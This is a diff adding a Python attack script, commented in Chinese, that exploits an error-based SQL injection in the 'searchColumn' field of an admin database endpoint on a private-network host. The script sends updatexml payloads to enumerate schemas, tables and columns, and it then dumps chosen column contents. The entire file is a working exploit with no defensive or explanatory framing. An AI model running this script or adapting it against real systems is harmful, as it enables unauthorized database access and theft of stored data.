@@ -1,0 +1,90 @@
+import requests
+import re
+
+# 目标设置
+TARGET_URL = "http://192.168.194.5:8080/tm6/app/admin/dbset/select"
+HEADERS = {
+    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
+    "X-Requested-With": "XMLHttpRequest",
+    "Origin": "http://192.168.194.5:8080",
+    "Referer": "http://192.168.194.5:8080/tm6/",
+    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+}
+
+def send_payload(payload):
+    data = {
+        "searchColumn": payload,
+        "searchText": "1"
+    }
+    try:
+        r = requests.post(TARGET_URL, headers=HEADERS, data=data)
+        match = re.search(r'~(.*?)~', r.text)
+        if match:
+            return match.group(1)
+    except Exception as e:
+        print("Error:", e)
+    return None
+
+def get_databases():
+    print("[*] 数据库列表：")
+    results = []
+    for i in range(0, 10):
+        payload = f"1=1 and updatexml(1,concat(0x7e,(select schema_name from information_schema.schemata limit {i},1),0x7e),1) and 'a'"
+        db = send_payload(payload)
+        if db:
+            print(f"{i}: {db}")
+            results.append(db)
+        else:
+            break
+    return results
+
+def get_tables(database):
+    print(f"[*] 数据库 `{database}` 的表列表：")
+    results = []
+    for i in range(0, 20):
+        payload = f"1=1 and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='{database}' limit {i},1),0x7e),1) and 'a'"
+        table = send_payload(payload)
+        if table:
+            print(f"{i}: {table}")
+            results.append(table)
+        else:
+            break
+    return results
+
+def get_columns(database, table):
+    print(f"[*] 表 `{table}` 的字段列表：")
+    results = []
+    for i in range(0, 20):
+        payload = f"1=1 and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_schema='{database}' and table_name='{table}' limit {i},1),0x7e),1) and 'a'"
+        col = send_payload(payload)
+        if col:
+            print(f"{i}: {col}")
+            results.append(col)
+        else:
+            break
+    return results
+
+def dump_data(database, table, column):
+    print(f"[*] 表 `{table}` 字段 `{column}` 的数据：")
+    for i in range(0, 10):
+        payload = f"1=1 and updatexml(1,concat(0x7e,(select {column} from {database}.{table} limit {i},1),0x7e),1) and 'a'"
+        data = send_payload(payload)
+        if data:
+            print(f"{i}: {data}")
+        else:
+            break
+
+if __name__ == "__main__":
+    dbs = get_databases()
+    idx = int(input("[*] 选择数据库编号："))
+    dbname = dbs[idx]
+
+    tables = get_tables(dbname)
+    idx = int(input("[*] 选择表编号："))
+    tablename = tables[idx]
+
+    columns = get_columns(dbname, tablename)
+    idx = int(input("[*] 选择字段编号："))
+    columnname = columns[idx]
+
+    dump_data(dbname, tablename, columnname)
